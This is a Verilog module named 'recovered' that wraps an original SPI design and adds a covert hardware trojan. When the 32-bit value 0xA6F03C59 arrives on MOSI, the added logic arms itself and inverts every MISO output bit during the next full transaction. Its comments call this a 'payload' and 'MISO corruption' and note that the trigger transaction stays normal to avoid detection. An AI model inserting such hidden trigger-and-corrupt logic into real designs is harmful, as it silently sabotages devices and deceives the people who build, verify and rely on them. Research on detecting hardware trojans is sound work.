module recovered (
    input  wire pin_36, // SCK
    input  wire pin_25, // ENC_DEC
    input  wire pin_28, // NORM_CS_N
    input  wire pin_32, // MOSI
    input  wire pin_34, // RST_N
    input  wire pin_27, // START
    output wire pin_38, // BUSY
    output wire pin_23, // ICE_LED
    output wire pin_31  // MISO
);

    wire orig_miso;

    // Instantiate original unmodified design
    recovered_original inst_recovered_original (
        .pin_36(pin_36),
        .pin_25(pin_25),
        .pin_28(pin_28),
        .pin_32(pin_32),
        .pin_34(pin_34),
        .pin_27(pin_27),
        .pin_38(pin_38),
        .pin_23(pin_23),
        .pin_31(orig_miso)
    );

    logic [31:0] shift_reg;
    logic [5:0]  bit_cnt;
    logic        trigger_matched;
    logic        payload_completed;
    logic        armed;

    // Block 1: Bit counter with asynchronous reset on transaction boundary (CS high) or RST_N low.
    // This safely discards any interrupted transactions by resetting the counter immediately.
    always_ff @(posedge pin_36 or posedge pin_28 or negedge pin_34) begin
        if (!pin_34) begin
            bit_cnt <= 6'b0;
        end else if (pin_28) begin
            bit_cnt <= 6'b0;
        end else begin
            if (bit_cnt == 6'd31) begin
                bit_cnt <= 6'b0;
            end else begin
                bit_cnt <= bit_cnt + 1'b1;
            end
        end
    end

    // Block 2: SPI shift register and match flags (Synchronous to SCK).
    // During an interrupted transaction or CS high period, these flags reliably hold their final state 
    // so they can be safely evaluated by the transaction-boundary state machine.
    always_ff @(posedge pin_36 or negedge pin_34) begin
        if (!pin_34) begin
            shift_reg         <= 32'b0;
            trigger_matched   <= 1'b0;
            payload_completed <= 1'b0;
        end else if (!pin_28) begin
            shift_reg <= {shift_reg[30:0], pin_32};
            if (bit_cnt == 6'd31) begin
                payload_completed <= 1'b1;
                if ({shift_reg[30:0], pin_32} == 32'hA6F03C59) begin
                    trigger_matched <= 1'b1;
                end else begin
                    trigger_matched <= 1'b0;
                end
            end else begin
                trigger_matched   <= 1'b0;
                payload_completed <= 1'b0;
            end
        end
    end

    // Block 3: Transaction-boundary state machine.
    // Triggers exactly when NORM_CS_N goes HIGH (end of a transaction).
    // This strictly ensures that no MISO modifications happen during the tail end of the trigger transaction.
    always_ff @(posedge pin_28 or negedge pin_34) begin
        if (!pin_34) begin
            armed <= 1'b0;
        end else begin
            if (trigger_matched) begin
                // A complete trigger transaction has ended; arm for the next transaction.
                armed <= 1'b1;
            end else if (armed && payload_completed) begin
                // A complete payload transaction has ended; disarm.
                // An interrupted transaction won't set payload_completed, so it won't consume the payload.
                armed <= 1'b0;
            end
        end
    end

    // Block 4: Safely apply MISO corruption.
    // The payload is activated purely on transaction boundaries. Since corruption only occurs
    // when armed AND NORM_CS_N is active (low), the trigger transaction remains 100% normal.
    assign pin_31 = (armed && !pin_28) ? ~orig_miso : orig_miso;

endmodule
